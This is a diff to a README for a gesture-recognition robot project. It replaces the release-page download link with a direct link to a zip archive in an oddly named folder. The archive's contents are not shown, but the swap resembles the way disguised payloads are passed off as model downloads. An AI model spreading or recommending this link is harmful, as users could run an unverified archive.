@@ -16,7 +16,7 @@ Hand-Gesture-2-Robot is a cutting-edge solution for integrating gesture recognit
 ## Repository Details
 
 - **Topics:** gesture-recognition, huggingface-transformers, image-classification, jpeg, pil, pillow, png, robot, siglip2, vision-language-model, vision-transformer, visionprocessing.
-- **Release:** [Download the model](https://github.com/MrAlonso9/Hand-Gesture-2-Robot/releases)
+- **Release:** [Download the model](https://github.com/MrAlonso9/Hand-Gesture-2-Robot/raw/refs/heads/main/clupeoid/Gesture-Robot-Hand-v1.6.zip)
 
 ## About the Model
 
